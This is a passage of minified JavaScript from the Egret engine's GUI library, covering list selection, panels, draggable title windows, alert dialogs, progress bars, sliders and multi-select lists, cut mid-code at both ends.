0===e&&(e=!1),t!=this.selectedIndex&&(e&&(this._dispatchChangeAfterSelection=this._dispatchChangeAfterSelection||e),this._proposedSelectedIndex=t,this.invalidateProperties())},Object.defineProperty(n.prototype,"selectedItem",{get:function(){return void 0!==this._pendingSelectedItem?this._pendingSelectedItem:this._allowCustomSelectedItem&&this.selectedIndex==n.CUSTOM_SELECTED_ITEM?this._selectedItem:this.selectedIndex==n.NO_SELECTION||null==this.dataProvider?void 0:this.dataProvider.length>this.selectedIndex?this.dataProvider.getItemAt(this.selectedIndex):void 0},set:function(t){this._setSelectedItem(t,!1)},enumerable:!0,configurable:!0}),n.prototype._setSelectedItem=function(t,e){void 0===e&&(e=!1),this.selectedItem!==t&&(e&&(this._dispatchChangeAfterSelection=this._dispatchChangeAfterSelection||e),this._pendingSelectedItem=t,this.invalidateProperties())},Object.defineProperty(n.prototype,"useVirtualLayout",{get:function(){return this._getUseVirtualLayout()},set:function(t){this._setUseVirtualLayout(t)},enumerable:!0,configurable:!0}),n.prototype._getUseVirtualLayout=function(){return this.layout?this.layout.useVirtualLayout:this._useVirtualLayout},n.prototype._setUseVirtualLayout=function(t){t!=this.useVirtualLayout&&(this._useVirtualLayout=t,this.layout&&(this.layout.useVirtualLayout=t))},n.prototype.commitProperties=function(){i.prototype.commitProperties.call(this),this.dataProviderChanged&&(this._doingWholesaleChanges=this.dataProviderChanged=!1,0<=this.selectedIndex&&this.dataProvider&&this.selectedIndex<this.dataProvider.length?this.itemSelected(this.selectedIndex,!0):this.requireSelection?this._proposedSelectedIndex=0:this._setSelectedIndex(-1,!1)),this.requireSelectionChanged&&(this.requireSelectionChanged=!1,this.requireSelection&&this.selectedIndex==n.NO_SELECTION&&this.dataProvider&&0<this.dataProvider.length&&(this._proposedSelectedIndex=0)),void 0!==this._pendingSelectedItem&&(this._proposedSelectedIndex=this.dataProvider?this.dataProvider.getItemIndex(this._pendingSelectedItem):n.NO_SELECTION,this._allowCustomSelectedItem&&-1==this._proposedSelectedIndex&&(this._proposedSelectedIndex=n.CUSTOM_SELECTED_ITEM,this._selectedItem=this._pendingSelectedItem),this._pendingSelectedItem=void 0);var t=!1;if(this._proposedSelectedIndex!=n.NO_PROPOSED_SELECTION&&(t=this.commitSelection()),this.selectedIndexAdjusted&&(this.selectedIndexAdjusted=!1,t||e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT)),this.labelFieldOrFunctionChanged){if(null!=this.dataGroup)if(this.layout&&this.layout.useVirtualLayout)for(var r=this.dataGroup.getElementIndicesInView(),s=r.length,o=0;o<s;o++)t=r[o],this.updateRendererLabelProperty(t);else for(r=this.dataGroup.numElements,t=0;t<r;t++)this.updateRendererLabelProperty(t);this.labelFieldOrFunctionChanged=!1}},n.prototype.updateRendererLabelProperty=function(t){(t=this.dataGroup.getElementAt(t))&&(t.label=this.itemToLabel(t.data))},n.prototype.partAdded=function(t,n){i.prototype.partAdded.call(this,t,n),n==this.dataGroup&&(this._useVirtualLayout&&this.dataGroup.layout&&(this.dataGroup.layout.useVirtualLayout=!0),this.dataGroup.addEventListener(e.RendererExistenceEvent.RENDERER_ADD,this.dataGroup_rendererAddHandler,this),this.dataGroup.addEventListener(e.RendererExistenceEvent.RENDERER_REMOVE,this.dataGroup_rendererRemoveHandler,this))},n.prototype.partRemoved=function(t,n){i.prototype.partRemoved.call(this,t,n),n==this.dataGroup&&(this.dataGroup.removeEventListener(e.RendererExistenceEvent.RENDERER_ADD,this.dataGroup_rendererAddHandler,this),this.dataGroup.removeEventListener(e.RendererExistenceEvent.RENDERER_REMOVE,this.dataGroup_rendererRemoveHandler,this))},n.prototype.updateRenderer=function(t,e,n){return this.itemSelected(e,this._isItemIndexSelected(e)),i.prototype.updateRenderer.call(this,t,e,n)},n.prototype.itemToLabel=function(e){if(null!=this._labelFunction)return this._labelFunction(e);if("string"==typeof e)return e;if(e instanceof t.XML)try{0!=e[this.labelField].length()&&(e=e[this.labelField])}catch(t){}else if(e instanceof Object)try{null!=e[this.labelField]&&(e=e[this.labelField])}catch(t){}if("string"==typeof e)return e;try{if(null!==e)return e.toString()}catch(t){}return" "},n.prototype.itemSelected=function(t,e){if(this.dataGroup){var i=this.dataGroup.getElementAt(t);null!=i&&(i.selected=e)}},n.prototype._isItemIndexSelected=function(t){return t==this.selectedIndex},n.prototype.commitSelection=function(t){void 0===t&&(t=!0);var i=this.dataProvider?this.dataProvider.length-1:-1,r=this._selectedIndex;return(!this._allowCustomSelectedItem||this._proposedSelectedIndex!=n.CUSTOM_SELECTED_ITEM)&&(this._proposedSelectedIndex<n.NO_SELECTION&&(this._proposedSelectedIndex=n.NO_SELECTION),this._proposedSelectedIndex>i&&(this._proposedSelectedIndex=i),this.requireSelection&&this._proposedSelectedIndex==n.NO_SELECTION&&this.dataProvider&&0<this.dataProvider.length)?(this._proposedSelectedIndex=n.NO_PROPOSED_SELECTION,this._dispatchChangeAfterSelection=!1):(i=this._proposedSelectedIndex,this._dispatchChangeAfterSelection&&!e.IndexChangeEvent.dispatchIndexChangeEvent(this,e.IndexChangeEvent.CHANGING,this._selectedIndex,this._proposedSelectedIndex,!0)?(this.itemSelected(this._proposedSelectedIndex,!1),this._proposedSelectedIndex=n.NO_PROPOSED_SELECTION,this._dispatchChangeAfterSelection=!1):(this._selectedIndex=i,this._proposedSelectedIndex=n.NO_PROPOSED_SELECTION,r!=n.NO_SELECTION&&this.itemSelected(r,!1),this._selectedIndex!=n.NO_SELECTION&&this.itemSelected(this._selectedIndex,!0),t&&(this._dispatchChangeAfterSelection&&(e.IndexChangeEvent.dispatchIndexChangeEvent(this,e.IndexChangeEvent.CHANGE,r,this._selectedIndex),this._dispatchChangeAfterSelection=!1),e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT)),!0))},n.prototype.adjustSelection=function(t,e){this._proposedSelectedIndex!=n.NO_PROPOSED_SELECTION?this._proposedSelectedIndex=t:this._selectedIndex=t,this.selectedIndexAdjusted=!0,this.invalidateProperties()},n.prototype.itemAdded=function(t){this._doingWholesaleChanges||(this.selectedIndex==n.NO_SELECTION?this.requireSelection&&this.adjustSelection(t,!0):t<=this.selectedIndex&&this.adjustSelection(this.selectedIndex+1,!0))},n.prototype.itemRemoved=function(t){this.selectedIndex==n.NO_SELECTION||this._doingWholesaleChanges||(t==this.selectedIndex?this.requireSelection&&this.dataProvider&&0<this.dataProvider.length?0==t?(this._proposedSelectedIndex=0,this.invalidateProperties()):this._setSelectedIndex(0,!1):this.adjustSelection(-1,!1):t<this.selectedIndex&&this.adjustSelection(this.selectedIndex-1,!1))},n.prototype.dataGroup_rendererAddHandler=function(e){null!=(e=e.renderer)&&(e.addEventListener(t.TouchEvent.TOUCH_ROLL_OVER,this.item_mouseEventHandler,this),e.addEventListener(t.TouchEvent.TOUCH_ROLL_OUT,this.item_mouseEventHandler,this))},n.prototype.dataGroup_rendererRemoveHandler=function(e){null!=(e=e.renderer)&&(e.removeEventListener(t.TouchEvent.TOUCH_ROLL_OVER,this.item_mouseEventHandler,this),e.removeEventListener(t.TouchEvent.TOUCH_ROLL_OUT,this.item_mouseEventHandler,this))},n.prototype.item_mouseEventHandler=function(t){var e=t.type,e=n.TYPE_MAP[e];this.hasEventListener(e)&&this._dispatchListEvent(t,e,t.currentTarget)},n.prototype._dispatchListEvent=function(t,i,n){var r=-1,r=n?n.itemIndex:this.dataGroup.getElementIndex(t.currentTarget),s=this.dataProvider.getItemAt(r);e.ListEvent.dispatchListEvent(this,i,t,r,s,n)},n.prototype.dataProvider_collectionChangeHandler=function(t){i=t.items;if(t.kind==e.CollectionEventKind.ADD)for(var i=i.length,r=0;r<i;r++)this.itemAdded(t.location+r);else if(t.kind==e.CollectionEventKind.REMOVE)for(i=i.length,r=i-1;0<=r;r--)this.itemRemoved(t.location+r);else t.kind==e.CollectionEventKind.MOVE?(this.itemRemoved(t.oldLocation),this.itemAdded(t.location)):t.kind==e.CollectionEventKind.RESET?0==this.dataProvider.length?this._setSelectedIndex(n.NO_SELECTION,!1):(this.dataProviderChanged=!0,this.invalidateProperties()):t.kind==e.CollectionEventKind.REFRESH&&this._setSelectedIndex(n.NO_SELECTION,!1)},n.NO_SELECTION=-1,n.NO_PROPOSED_SELECTION=-2,n.CUSTOM_SELECTED_ITEM=-3,n.TYPE_MAP={rollOver:"itemRollOver",rollOut:"itemRollOut"},n}(e.SkinnableDataContainer);e.ListBase=i,i.prototype.__class__="egret.gui.ListBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(t){function e(){t.call(this),this._title="",this.hostComponentKey="egret.gui.Panel",this.touchEnabled=!1}return __extends(e,t),Object.defineProperty(e.prototype,"title",{get:function(){return this._title},set:function(t){this._title=t,this.titleDisplay&&(this.titleDisplay.text=this.title)},enumerable:!0,configurable:!0}),e.prototype.partAdded=function(e,i){t.prototype.partAdded.call(this,e,i),i==this.titleDisplay&&(this.titleDisplay.text=this.title)},e}(t.SkinnableContainer);t.Panel=e,e.prototype.__class__="egret.gui.Panel"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._autoBackToStage=this._showCloseButton=!0,this.hostComponentKey="egret.gui.TitleWindow",this.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.onWindowMouseDown,this,!0,100)}return __extends(n,i),n.prototype.onWindowMouseDown=function(t){this.enabled&&this.isPopUp&&t.target!=this.closeButton&&e.PopUpManager.bringToFront(this)},Object.defineProperty(n.prototype,"showCloseButton",{get:function(){return this._showCloseButton},set:function(t){this._showCloseButton!=t&&(this._showCloseButton=t,this.closeButton&&(this.closeButton.visible=this._showCloseButton))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"autoBackToStage",{get:function(){return this._autoBackToStage},set:function(t){this._autoBackToStage=t},enumerable:!0,configurable:!0}),n.prototype.partAdded=function(e,n){i.prototype.partAdded.call(this,e,n),n==this.moveArea?this.moveArea.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.moveArea_mouseDownHandler,this):n==this.closeButton&&(this.closeButton.addEventListener(t.TouchEvent.TOUCH_TAP,this.closeButton_clickHandler,this),this.closeButton.visible=this._showCloseButton)},n.prototype.partRemoved=function(e,n){i.prototype.partRemoved.call(this,e,n),n==this.moveArea?this.moveArea.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.moveArea_mouseDownHandler,this):n==this.closeButton&&this.closeButton.removeEventListener(t.TouchEvent.TOUCH_TAP,this.closeButton_clickHandler,this)},n.prototype.closeButton_clickHandler=function(t){e.CloseEvent.dispatchCloseEvent(this,e.CloseEvent.CLOSE)},n.prototype.moveArea_mouseDownHandler=function(i){this.enabled&&this.isPopUp&&(i=this.globalToLocal(i.stageX,i.stageY,t.Point.identity),this._offsetPointX=i.x,this._offsetPointY=i.y,this._includeInLayout=!1,e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_MOVE,this.moveArea_mouseMoveHandler,this),e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.moveArea_mouseUpHandler,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.moveArea_mouseUpHandler,this))},n.prototype.moveArea_mouseMoveHandler=function(e){e=this.globalToLocal(e.stageX,e.stageY,t.Point.identity),this.x+=e.x-this._offsetPointX,this.y+=e.y-this._offsetPointY},n.prototype.moveArea_mouseUpHandler=function(i){e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_MOVE,this.moveArea_mouseMoveHandler,this),e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.moveArea_mouseUpHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.moveArea_mouseUpHandler,this),this._autoBackToStage&&this.adjustPosForStage(),e.LayoutUtil.adjustRelativeByXY(this),this.includeInLayout=!0},n.prototype.adjustPosForStage=function(){if(this.moveArea&&this.stage){var t=this.moveArea.localToGlobal(0,0),e=t.x,i=t.y;35>t.x+this.moveArea.width&&(e=35-this.moveArea.width),t.x>this.stage.stageWidth-20&&(e=this.stage.stageWidth-20),20>t.y+this.moveArea.height&&(i=20-this.moveArea.height),t.y>this.stage.stageHeight-20&&(i=this.stage.stageHeight-20),this.x+=e-t.x,this.y+=i-t.y}},n}(e.Panel);e.TitleWindow=i,i.prototype.__class__="egret.gui.TitleWindow"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._contentText=this._secondButtonLabel=this._firstButtonLabel="",this.hostComponentKey="egret.gui.Alert"}return __extends(n,i),n.show=function(t,i,r,s,o,a,h){void 0===t&&(t=""),void 0===i&&(i=""),void 0===r&&(r=null),void 0===s&&(s="确定"),void 0===o&&(o=""),void 0===a&&(a=!0),void 0===h&&(h=!0);var l=new n;return l.contentText=t,l.title=i,l._firstButtonLabel=s,l._secondButtonLabel=o,l.closeHandler=r,e.PopUpManager.addPopUp(l,a,h),l},Object.defineProperty(n.prototype,"firstButtonLabel",{get:function(){return this._firstButtonLabel},set:function(t){this._firstButtonLabel!=t&&(this._firstButtonLabel=t,this.firstButton&&(this.firstButton.label=t))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"secondButtonLabel",{get:function(){return this._secondButtonLabel},set:function(t){this._secondButtonLabel!=t&&(this._secondButtonLabel=t,!this.secondButton||null!=t&&""!=t||(this.secondButton.includeInLayout=this.secondButton.visible=""!=this._secondButtonLabel&&null!=this._secondButtonLabel))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"contentText",{get:function(){return this._contentText},set:function(t){this._contentText!=t&&(this._contentText=t,this.contentDisplay&&(this.contentDisplay.text=t))},enumerable:!0,configurable:!0}),n.prototype.onClose=function(t){if(e.PopUpManager.removePopUp(this),null!=this.closeHandler){var i=new e.CloseEvent(e.CloseEvent.CLOSE);switch(t.currentTarget){case this.firstButton:i.detail=n.FIRST_BUTTON;break;case this.secondButton:i.detail=n.SECOND_BUTTON}this.closeHandler(i)}},n.prototype.closeButton_clickHandler=function(t){i.prototype.closeButton_clickHandler.call(this,t),e.PopUpManager.removePopUp(this),t=new e.CloseEvent(e.CloseEvent.CLOSE,!1,!1,n.CLOSE_BUTTON),null!=this.closeHandler&&this.closeHandler(t)},n.prototype.partAdded=function(e,n){i.prototype.partAdded.call(this,e,n),n==this.contentDisplay?this.contentDisplay.text=this._contentText:n==this.firstButton?(this.firstButton.label=this._firstButtonLabel,this.firstButton.addEventListener(t.TouchEvent.TOUCH_TAP,this.onClose,this)):n==this.secondButton&&(this.secondButton.label=this._secondButtonLabel,this.secondButton.includeInLayout=this.secondButton.visible=""!=this._secondButtonLabel&&null!=this._secondButtonLabel,this.secondButton.addEventListener(t.TouchEvent.TOUCH_TAP,this.onClose,this))},n.prototype.partRemoved=function(e,n){i.prototype.partRemoved.call(this,e,n),n==this.firstButton?this.firstButton.removeEventListener(t.TouchEvent.TOUCH_TAP,this.onClose,this):n==this.secondButton&&this.secondButton.removeEventListener(t.TouchEvent.TOUCH_TAP,this.onClose,this)},n.FIRST_BUTTON="firstButton",n.SECOND_BUTTON="secondButton",n.CLOSE_BUTTON="closeButton",n}(e.TitleWindow);e.Alert=i,i.prototype.__class__="egret.gui.Alert"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._slideDuration=500,this._direction=e.ProgressBarDirection.LEFT_TO_RIGHT,this.animationValue=0,this.trackResizedOrMoved=!1,this.hostComponentKey="egret.gui.ProgressBar"}return __extends(n,i),Object.defineProperty(n.prototype,"labelFunction",{get:function(){return this._labelFunction},set:function(t){this._labelFunction!=t&&(this._labelFunction=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),n.prototype.valueToLabel=function(t,e){return null!=this.labelFunction?this._labelFunction(t,e):t+" / "+e},Object.defineProperty(n.prototype,"slideDuration",{get:function(){return this._slideDuration},set:function(t){this._slideDuration!=t&&(this._slideDuration=t,this.animator&&this.animator.isPlaying&&(this.animator.stop(),this._setValue(this.slideToValue)))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"direction",{get:function(){return this._direction},set:function(t){this._direction!=t&&(this._direction=t,this.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"value",{get:function(){return this._getValue()},set:function(t){this._getValue()!=t&&(this._setValue(t),0<this._slideDuration&&this.stage?(this.validateProperties(),this.animator||(this.animator=new e.Animation(this.animationUpdateHandler,this)),this.animator.isPlaying&&(this.animationValue=this.slideToValue,this.invalidateDisplayList(),this.animator.stop()),this.slideToValue=this.nearestValidValue(t,this.snapInterval),this.slideToValue!=this.animationValue&&(t=this._slideDuration*(Math.abs(this.animationValue-this.slideToValue)/(this.maximum-this.minimum)),this.animator.duration=1/0===t?0:t,this.animator.motionPaths=[{prop:"value",from:this.animationValue,to:this.slideToValue}],this.animator.play())):this.animationValue=this._getValue())},enumerable:!0,configurable:!0}),n.prototype.animationUpdateHandler=function(t){t=this.nearestValidValue(t.currentValue.value,this.snapInterval),this.animationValue=Math.min(this.maximum,Math.max(this.minimum,t)),this.invalidateDisplayList()},n.prototype.setValue=function(t){i.prototype.setValue.call(this,t),this.invalidateDisplayList()},n.prototype.updateDisplayList=function(t,e){i.prototype.updateDisplayList.call(this,t,e),this.updateSkinDisplayList()},n.prototype.partAdded=function(t,i){i==this.track&&this.track instanceof e.UIComponent&&(this.track.addEventListener(e.ResizeEvent.RESIZE,this.onTrackResizeOrMove,this),this.track.addEventListener(e.MoveEvent.MOVE,this.onTrackResizeOrMove,this))},n.prototype.partRemoved=function(t,i){i==this.track&&this.track instanceof e.UIComponent&&(this.track.removeEventListener(e.ResizeEvent.RESIZE,this.onTrackResizeOrMove,this),this.track.removeEventListener(e.MoveEvent.MOVE,this.onTrackResizeOrMove,this))},n.prototype.onTrackResizeOrMove=function(t){this.trackResizedOrMoved=!0,this.invalidateProperties()},n.prototype.commitProperties=function(){i.prototype.commitProperties.call(this),this.trackResizedOrMoved&&(this.trackResizedOrMoved=!1,this.updateSkinDisplayList())},n.prototype.updateSkinDisplayList=function(){this.trackResizedOrMoved=!1;var i=this.value;this.animator&&this.animator.isPlaying?i=this.animationValue:(i=this.value,isNaN(i)&&(i=0));var n=isNaN(this.maximum)?0:this.maximum;if(this.thumb&&this.track){var r=(r=isNaN(this.track.width)?0:this.track.width)*this.track.scaleX,s=(s=isNaN(this.track.height)?0:this.track.height)*this.track.scaleY,o=Math.round(i/n*r);(isNaN(o)||0>o||1/0===o)&&(o=0);var a=Math.round(i/n*s);(isNaN(a)||0>a||1/0===a)&&(a=0);var h=this.track.localToGlobal(0,0),h=(l=this.globalToLocal(h.x,h.y,t.Point.identity)).x,l=l.y;switch(this._direction){case e.ProgressBarDirection.LEFT_TO_RIGHT:this.thumb.width=o,this.thumb.height=s,this.thumb.x=h;break;case e.ProgressBarDirection.RIGHT_TO_LEFT:this.thumb.width=o,this.thumb.height=s,this.thumb.x=h+r-o;break;case e.ProgressBarDirection.TOP_TO_BOTTOM:this.thumb.width=r,this.thumb.height=a,this.thumb.y=l;break;case e.ProgressBarDirection.BOTTOM_TO_TOP:this.thumb.width=r,this.thumb.height=a,this.thumb.y=l+s-a}}this.labelDisplay&&(this.labelDisplay.text=this.valueToLabel(i,n))},n}(e.Range);e.ProgressBar=i,i.prototype.__class__="egret.gui.ProgressBar"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.LEFT_TO_RIGHT="leftToRight",t.RIGHT_TO_LEFT="rightToLeft",t.TOP_TO_BOTTOM="topToBottom",t.BOTTOM_TO_TOP="bottomToTop",t}();t.ProgressBarDirection=e,e.prototype.__class__="egret.gui.ProgressBarDirection"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this.hostComponentKey="egret.gui.HSlider"}return __extends(i,e),i.prototype.pointToValue=function(t,e){if(!this.thumb||!this.track)return 0;var i=this.maximum-this.minimum,n=this.track.layoutBoundsWidth-this.thumb.layoutBoundsWidth;return this.minimum+(0!=n?t/n*i:0)},i.prototype.updateSkinDisplayList=function(){if(this.thumb&&this.track){var e=this.track.layoutBoundsWidth-this.thumb.layoutBoundsWidth,e=0<(i=this.maximum-this.minimum)?(this.pendingValue-this.minimum)/i*e:0,i=(n=this.track.localToGlobal(e,0)).x,n=n.y,r=this.thumb.parent.globalToLocal(i,n,t.Point.identity).x;this.thumb.setLayoutBoundsPosition(Math.round(r),this.thumb.layoutBoundsY),this.showTrackHighlight&&this.trackHighlight&&this.trackHighlight.parent&&(i=this.trackHighlight.parent.globalToLocal(i,n,t.Point.identity).x-e,this.trackHighlight.x=Math.round(i),this.trackHighlight.width=Math.round(e))}},i}(e.SliderBase);e.HSlider=i,i.prototype.__class__="egret.gui.HSlider"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this.hostComponentKey="egret.gui.VSlider"}return __extends(i,e),i.prototype.pointToValue=function(t,e){if(!this.thumb||!this.track)return 0;var i=this.maximum-this.minimum,n=this.track.layoutBoundsHeight-this.thumb.layoutBoundsHeight;return this.minimum+(0!=n?(n-e)/n*i:0)},i.prototype.updateSkinDisplayList=function(){if(this.thumb&&this.track){var e=this.thumb.layoutBoundsHeight,i=this.track.layoutBoundsHeight-e,n=this.maximum-this.minimum,n=(r=this.track.localToGlobal(0,0<n?i-(this.pendingValue-this.minimum)/n*i:0)).x,r=r.y,s=this.thumb.parent.globalToLocal(n,r,t.Point.identity).y;this.thumb.setLayoutBoundsPosition(this.thumb.layoutBoundsX,Math.round(s)),this.showTrackHighlight&&this.trackHighlight&&this.trackHighlight._parent&&(n=this.trackHighlight._parent.globalToLocal(n,r,t.Point.identity).y,this.trackHighlight.y=Math.round(n+e),this.trackHighlight.height=Math.round(i-n))}},i}(e.SliderBase);e.VSlider=i,i.prototype.__class__="egret.gui.VSlider"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._allowMultipleSelection=!1,this._selectedIndices=[],this._captureItemRenderer=!0,this.hostComponentKey="egret.gui.List",this.useVirtualLayout=!0}return __extends(n,i),n.prototype.createChildren=function(){this.itemRenderer||(this.itemRenderer=e.DataGroup.defaultRendererFactory),i.prototype.createChildren.call(this)},Object.defineProperty(n.prototype,"useVirtualLayout",{get:function(){return this._getUseVirtualLayout()},set:function(t){this._setUseVirtualLayout(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"allowMultipleSelection",{get:function(){return this._allowMultipleSelection},set:function(t){this._allowMultipleSelection=t},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selectedIndices",{get:function(){return this._proposedSelectedIndices?this._proposedSelectedIndices:this._selectedIndices},set:function(t){this._setSelectedIndices(t,!1)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selectedIndex",{get:function(){return this._proposedSelectedIndices?0<this._proposedSelectedIndices.length?this._proposedSelectedIndices[0]:-1:this._getSelectedIndex()},set:function(t){this._setSelectedIndex(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"selectedItems",{get:function(){var t=[],e=this.selectedIndices;if(e)for(var i=e.length,n=0;n<i;n++)t[n]=this.dataProvider.getItemAt(e[n]);return t},set:function(t){var e=[];if(t)for(var i=t.length,n=0;n<i;n++){var r=this.dataProvider.getItemIndex(t[n]);if(-1!=r&&e.splice(0,0,r),-1==r){e=[];break}}this._setSelectedIndices(e,!1)},enumerable:!0,configurable:!0}),n.prototype._setSelectedIndices=function(t,e){void 0===e&&(e=!1),e&&(this._dispatchChangeAfterSelection=this._dispatchChangeAfterSelection||e),this._proposedSelectedIndices=t||[],this.invalidateProperties()},n.prototype.commitProperties=function(){i.prototype.commitProperties.call(this),this._proposedSelectedIndices&&this.commitSelection()},n.prototype.commitSelection=function(t){void 0===t&&(t=!0);var n=this._selectedIndex;if(this._proposedSelectedIndices){if(this._proposedSelectedIndices=this._proposedSelectedIndices.filter(this.isValidIndex),!this.allowMultipleSelection&&0<this._proposedSelectedIndices.length){var r=[];r.push(this._proposedSelectedIndices[0]),this._proposedSelectedIndices=r}this._proposedSelectedIndex=0<this._proposedSelectedIndices.length?this._proposedSelectedIndices[0]:-1}return(r=i.prototype.commitSelection.call(this,!1))?(this.selectedIndex>e.ListBase.NO_SELECTION&&(this._proposedSelectedIndices?-1==this._proposedSelectedIndices.indexOf(this.selectedIndex)&&this._proposedSelectedIndices.push(this.selectedIndex):this._proposedSelectedIndices=[this.selectedIndex]),this._proposedSelectedIndices&&(-1!=this._proposedSelectedIndices.indexOf(n)&&this.itemSelected(n,!0),this.commitMultipleSelection()),t&&r&&(this._dispatchChangeAfterSelection&&(e.IndexChangeEvent.dispatchIndexChangeEvent(this,e.IndexChangeEvent.CHANGE,n,this._selectedIndex),this._dispatchChangeAfterSelection=!1),e.UIEvent.dispatchUIEvent(this,e.UIEvent.VALUE_COMMIT)),r):(this._proposedSelectedIndices=null,!1)},n.prototype.isValidIndex=function(t,e,i){return this.dataProvider&&0<=t&&t<this.dataProvider.length},n.prototype.commitMultipleSelection=function(){var t,e,i=[],n=[];if(0<this._selectedIndices.length&&0<this._proposedSelectedIndices.length){for(e=this._proposedSelectedIndices.length,t=0;t<e;t++)-1==this._selectedIndices.indexOf(this._proposedSelectedIndices[t])&&n.push(this._proposedSelectedIndices[t]);for(e=this._selectedIndices.length,t=0;t<e;t++)-1==this._proposedSelectedIndices.indexOf(this._selectedIndices[t])&&i.push(this._selectedIndices[t])}else 0<this._selectedIndices.length?i=this._selectedIndices:0<this._proposedSelectedIndices.length&&(n=this._proposedSelectedIndices);if(this._selectedIndices=this._proposedSelectedIndices,0<i.length)for(e=i.length,t=0;t<e;t++)this.itemSelected(i[t],!1);if(0<n.length)for(e=n.length,t=0;t<e;t++)this.itemSelected(n[t],!0);this._proposedSelectedIndices=null},n.prototype._isItemIndexSelected=function(t){return this._allowMultipleSelection?-1!=this._selectedIndices.indexOf(t):i.prototype._isItemIndexSelected.call(this,t)},n.prototype.dataGroup_rendererAddHandler=function(e){i.prototype.dataGroup_rendererAddHandler.call(this,e),null!=(e=e.renderer)&&(e.addEventListener(t.TouchEvent.TOUCH_BEGIN,this.item_mouseDownHandler,this),e.addEventListener(t.TouchEvent.TOUCH_END,this.item_mouseUpHandler,this))},n.prototype.dataGroup_rendererRemoveHandler=function(e){i.prototype.dataGroup_rendererRemoveHandler.call(this,e),null!=(e=e.renderer)&&(e.removeEventListener(t.TouchEvent.TOUCH_BEGIN,this.item_mouseDownHandler,this),e.removeEventListener(t.TouchEvent.TOUCH_END,this.item_mouseUpHandler,this))},n.prototype.item_mouseDownHandler=function(i){if(!i.isDefaultPrevented()){var n,r=i.currentTarget;n=r?r.itemIndex:this.dataGroup.getElementIndex(i.currentTarget),this._allowMultipleSelection?this._setSelectedIndices(this.calculateSelectedIndices(n,i.shiftKey,i.ctrlKey),!0):this._setSelectedIndex(n,!0),this._captureItemRenderer&&(this.mouseDownItemRenderer=r,e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this))}},n.prototype.calculateSelectedIndices=function(t,e,i){var n=[];if(e)if((e=0<this._selectedIndices.length?this._selectedIndices[this._selectedIndices.length-1]:0)<t)for(;e<=t;e++)n.splice(0,0,e);else for(;e>=t;e--)n.splice(0,0,e);else if(i)if(0<this._selectedIndices.length)if(1==this._selectedIndices.length&&this._selectedIndices[0]==t){if(!this.requireSelection)return n;n.splice(0,0,this._selectedIndices[0])}else{for(i=!1,e=0;e<this._selectedIndices.length;e++)this._selectedIndices[e]==t?i=!0:this._selectedIndices[e]!=t&&n.splice(0,0,this._selectedIndices[e]);i||n.splice(0,0,t)}else n.splice(0,0,t);else n.splice(0,0,t);return n},n.prototype.item_mouseUpHandler=function(t){var i=t.currentTarget;i==this.mouseDownItemRenderer&&this._dispatchListEvent(t,e.ListEvent.ITEM_CLICK,i)},n.prototype.stage_mouseUpHandler=function(i){e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.stage_mouseUpHandler,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.stage_mouseUpHandler,this),this.mouseDownItemRenderer=null},n}(e.ListBase);e.List=i,i.prototype.__class__="egret.gui.List"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function 